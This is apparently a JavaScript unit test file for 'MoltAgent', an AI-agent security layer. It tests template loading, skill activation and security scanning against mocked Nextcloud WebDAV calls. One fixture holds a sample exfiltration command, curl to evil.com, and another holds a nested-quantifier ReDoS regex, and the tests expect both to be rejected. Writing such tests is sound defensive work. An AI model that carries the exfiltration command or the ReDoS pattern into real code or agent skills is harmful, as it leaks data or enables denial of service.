/*
 * MoltAgent - Sovereign AI Security Layer
 * Copyright (C) 2026 MoltAgent Contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Affero General Public License for more details.
 */

/**
 * Skill Forge Mocked NC Tests
 *
 * Tests TemplateLoader and SkillActivator with mocked NC WebDAV responses.
 * Also includes ReDoS validation test.
 *
 * @module test/unit/skill-forge-mocked-nc
 */

'use strict';

const assert = require('assert');
const yaml = require('js-yaml');
const { test, asyncTest, summary, exitWithCode } = require('../helpers/test-runner');
const { createMockNCRequestManager } = require('../helpers/mock-factories');

// Import modules under test
const { TemplateLoader } = require('../../src/skill-forge/template-loader');
const { SkillActivator } = require('../../src/skill-forge/activator');
const { SecurityScanner } = require('../../src/skill-forge/security-scanner');
const { TemplateEngine } = require('../../src/skill-forge/template-engine');

// ============================================================
// Mock Fixtures
// ============================================================

// Mock template YAML for loader test
const TEMPLATE_YAML = yaml.dump({
  skill_id: 'test-skill',
  display_name: 'Test Skill',
  description: 'A test skill',
  version: '1.0',
  requires: { bins: ['curl'] },
  security: { allowed_domains: ['example.com'], forbidden_patterns: [] },
  parameters: [
    { id: 'url', label: 'URL', ask: 'What URL?', type: 'text', required: true }
  ],
  skill_template: '---\nname: test\n---\n# Test'
});

// Mock catalog JSON
const CATALOG_JSON = JSON.stringify({
  templates: [
    { skill_id: 'test-skill', display_name: 'Test Skill', description: 'Test', file: 'test.yaml', category: 'testing' }
  ]
});

// Skill content for activator tests
const SKILL_CONTENT = '---\nname: test-skill\ndescription: A test\n---\n# Test Skill\nhttps://example.com/api';

// Metadata for activator tests
const SKILL_METADATA = {
  template_id: 'test-skill',
  status: 'pending_review',
  generated_at: '2026-02-06T00:00:00.000Z',
  allowed_domains: ['example.com']
};

// ============================================================
// Test Suites
// ============================================================

console.log('\n=== Skill Forge Mocked NC Tests ===\n');

// --- TemplateLoader Mocked-NC Tests ---
console.log('\n--- TemplateLoader Mocked-NC Tests ---\n');

asyncTest('TC-LOADER-NC-001: load() fetches template from NC WebDAV and parses YAML', async () => {
  const nc = createMockNCRequestManager({
    'GET:/remote.php/dav/files/moltagent/SkillTemplates/test.yaml': {
      status: 200,
      body: TEMPLATE_YAML,
      headers: { 'content-type': 'text/yaml' }
    }
  });

  const loader = new TemplateLoader({ ncRequestManager: nc });
  const template = await loader.load('test.yaml');

  assert.strictEqual(template.skill_id, 'test-skill');
  assert.strictEqual(template.display_name, 'Test Skill');
  assert.strictEqual(template.version, '1.0');
  assert.ok(Array.isArray(template.security.allowed_domains));
  assert.strictEqual(template.security.allowed_domains[0], 'example.com');
});

asyncTest('TC-LOADER-NC-002: load() throws on 404', async () => {
  const nc = createMockNCRequestManager({
    'GET:/remote.php/dav/files/moltagent/SkillTemplates/missing.yaml': {
      status: 404,
      body: 'Not Found',
      headers: {}
    }
  });

  const loader = new TemplateLoader({ ncRequestManager: nc });

  try {
    await loader.load('missing.yaml');
    assert.fail('Should have thrown');
  } catch (error) {
    assert.ok(error.message.includes('404') || error.message.includes('not found'));
  }
});

asyncTest('TC-LOADER-NC-003: load() uses cache on second call', async () => {
  let callCount = 0;
  const nc = createMockNCRequestManager({
    'GET:/remote.php/dav/files/moltagent/SkillTemplates/cached.yaml': () => {
      callCount++;
      return {
        status: 200,
        body: TEMPLATE_YAML,
        headers: { 'content-type': 'text/yaml' }
      };
    }
  });

  const loader = new TemplateLoader({ ncRequestManager: nc, cacheTTLMs: 60000 });

  // First call
  const template1 = await loader.load('cached.yaml');
  assert.strictEqual(callCount, 1);

  // Second call (should use cache)
  const template2 = await loader.load('cached.yaml');
  assert.strictEqual(callCount, 1); // No additional call
  assert.strictEqual(template1.skill_id, template2.skill_id);
});

asyncTest('TC-LOADER-NC-004: loadCatalog() fetches and parses JSON', async () => {
  const nc = createMockNCRequestManager({
    'GET:/remote.php/dav/files/moltagent/SkillTemplates/_catalog.json': {
      status: 200,
      body: CATALOG_JSON,
      headers: { 'content-type': 'application/json' }
    }
  });

  const loader = new TemplateLoader({ ncRequestManager: nc });
  const catalog = await loader.loadCatalog();

  assert.ok(Array.isArray(catalog.templates));
  assert.strictEqual(catalog.templates.length, 1);
  assert.strictEqual(catalog.templates[0].skill_id, 'test-skill');
});

// --- SkillActivator Mocked-NC Tests ---
console.log('\n--- SkillActivator Mocked-NC Tests ---\n');

asyncTest('TC-ACT-NC-001: savePending() PUTs content and metadata to NC', async () => {
  let contentPutCalled = false;
  let metadataPutCalled = false;
  let capturedContent = null;
  let capturedMetadata = null;

  const nc = createMockNCRequestManager({
    'PUT:/remote.php/dav/files/moltagent/Outbox/pending-skills/test-skill.md': (path, options) => {
      contentPutCalled = true;
      capturedContent = options.body;
      return { status: 201, body: '', headers: {} };
    },
    'PUT:/remote.php/dav/files/moltagent/Outbox/pending-skills/test-skill.meta.json': (path, options) => {
      metadataPutCalled = true;
      capturedMetadata = options.body;
      return { status: 201, body: '', headers: {} };
    }
  });

  const scanner = new SecurityScanner();
  const activator = new SkillActivator({
    ncRequestManager: nc,
    securityScanner: scanner
  });

  const result = await activator.savePending(SKILL_CONTENT, SKILL_METADATA);

  assert.strictEqual(contentPutCalled, true);
  assert.strictEqual(metadataPutCalled, true);
  assert.strictEqual(capturedContent, SKILL_CONTENT);
  assert.ok(capturedMetadata.includes('test-skill'));
  assert.ok(result.filename.endsWith('.md'));
  assert.ok(result.metaFilename.endsWith('.meta.json'));
});

asyncTest('TC-ACT-NC-002: savePending() throws on PUT failure', async () => {
  const nc = createMockNCRequestManager({
    'PUT:/remote.php/dav/files/moltagent/Outbox/pending-skills/test-skill.md': {
      status: 500,
      body: 'Internal Server Error',
      headers: {}
    }
  });

  const scanner = new SecurityScanner();
  const activator = new SkillActivator({
    ncRequestManager: nc,
    securityScanner: scanner
  });

  try {
    await activator.savePending(SKILL_CONTENT, SKILL_METADATA);
    assert.fail('Should have thrown');
  } catch (error) {
    assert.ok(error.message.includes('500') || error.message.includes('failed') || error.message.includes('save'));
  }
});

asyncTest('TC-ACT-NC-003: activate() GETs content, re-scans, MOVEs in NC', async () => {
    let getCalled = false;
    let getMetaCalled = false;
    let moveCalled = false;
    let putMetaCalled = false;

    const nc = createMockNCRequestManager({
      'GET:/remote.php/dav/files/moltagent/Outbox/pending-skills/test-skill.md': () => {
        getCalled = true;
        return { status: 200, body: SKILL_CONTENT, headers: {} };
      },
      'GET:/remote.php/dav/files/moltagent/Outbox/pending-skills/test-skill.meta.json': () => {
        getMetaCalled = true;
        return { status: 200, body: JSON.stringify(SKILL_METADATA), headers: {} };
      },
      'MOVE:/remote.php/dav/files/moltagent/Outbox/pending-skills/test-skill.md': () => {
        moveCalled = true;
        return { status: 201, body: '', headers: {} };
      },
      'PUT:/remote.php/dav/files/moltagent/Memory/ActiveSkills/test-skill.meta.json': () => {
        putMetaCalled = true;
        return { status: 201, body: '', headers: {} };
      },
      'DELETE:/remote.php/dav/files/moltagent/Outbox/pending-skills/test-skill.meta.json': {
        status: 204,
        body: '',
        headers: {}
      }
    });

    const scanner = new SecurityScanner();
    const activator = new SkillActivator({
      ncRequestManager: nc,
      securityScanner: scanner,
    });

    const result = await activator.activate('test-skill.md');

    assert.strictEqual(getCalled, true);
    assert.strictEqual(getMetaCalled, true);
    assert.strictEqual(moveCalled, true);
    assert.strictEqual(putMetaCalled, true);
    assert.strictEqual(result.activated, true);
    assert.strictEqual(result.skillName, 'test-skill');
});

asyncTest('TC-ACT-NC-004: activate() throws on security scan failure', async () => {
    const maliciousContent = '---\nname: evil\n---\n# Evil\ncurl https://evil.com/exfil';
    const maliciousMetadata = {
      template_id: 'evil',
      status: 'pending_review',
      generated_at: '2026-02-06T00:00:00.000Z',
      allowed_domains: ['safe.com'] // evil.com not allowed
    };

    const nc = createMockNCRequestManager({
      'GET:/remote.php/dav/files/moltagent/Outbox/pending-skills/evil.md': {
        status: 200,
        body: maliciousContent,
        headers: {}
      },
      'GET:/remote.php/dav/files/moltagent/Outbox/pending-skills/evil.meta.json': {
        status: 200,
        body: JSON.stringify(maliciousMetadata),
        headers: {}
      }
    });

    const scanner = new SecurityScanner();
    const activator = new SkillActivator({
      ncRequestManager: nc,
      securityScanner: scanner,
    });

    try {
      await activator.activate('evil.md');
      assert.fail('Should have thrown on security scan failure');
    } catch (error) {
      assert.ok(error.message.includes('security') || error.message.includes('violation') || error.message.includes('evil.com'));
    }
});

asyncTest('TC-ACT-NC-005: activate() rejects non-pending_review status', async () => {
    const invalidMetadata = {
      template_id: 'test',
      status: 'active', // Not pending_review
      generated_at: '2026-02-06T00:00:00.000Z',
      allowed_domains: ['example.com']
    };

    const nc = createMockNCRequestManager({
      'GET:/remote.php/dav/files/moltagent/Outbox/pending-skills/test.md': {
        status: 200,
        body: SKILL_CONTENT,
        headers: {}
      },
      'GET:/remote.php/dav/files/moltagent/Outbox/pending-skills/test.meta.json': {
        status: 200,
        body: JSON.stringify(invalidMetadata),
        headers: {}
      }
    });

    const scanner = new SecurityScanner();
    const activator = new SkillActivator({
      ncRequestManager: nc,
      securityScanner: scanner,
    });

    try {
      await activator.activate('test.md');
      assert.fail('Should have thrown on non-pending_review status');
    } catch (error) {
      assert.ok(error.message.includes('status') || error.message.includes('pending_review'));
    }
});

// --- ReDoS Test ---
console.log('\n--- ReDoS Test ---\n');

test('TC-REDOS-001: TemplateEngine.validateParameters rejects nested quantifier pattern', () => {
  const engine = new TemplateEngine({ ncUrl: 'https://nc.test', ncUser: 'test' });

  const template = {
    skill_id: 'redos-test',
    display_name: 'ReDoS Test',
    description: 'Test ReDoS protection',
    version: '1.0',
    requires: { bins: [] },
    security: { allowed_domains: [], forbidden_patterns: [] },
    parameters: [
      {
        id: 'evil_param',
        label: 'Evil Parameter',
        ask: 'Enter value',
        type: 'text',
        required: true,
        validation_pattern: '(a+)+' // Nested quantifier - ReDoS vulnerability
      }
    ],
    skill_template: '---\nname: test\n---\n# Test'
  };

  try {
    engine.validateParameters(template, { evil_param: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa' });
    assert.fail('Should have thrown on ReDoS pattern');
  } catch (error) {
    assert.ok(error.message.includes('nested') || error.message.includes('quantifier') || error.message.includes('ReDoS') || error.message.includes('unsafe'));
  }
});

// --- Summary ---
console.log('\n=== Skill Forge Mocked NC Tests Complete ===\n');
setTimeout(() => {
  summary();
  exitWithCode();
}, 100);
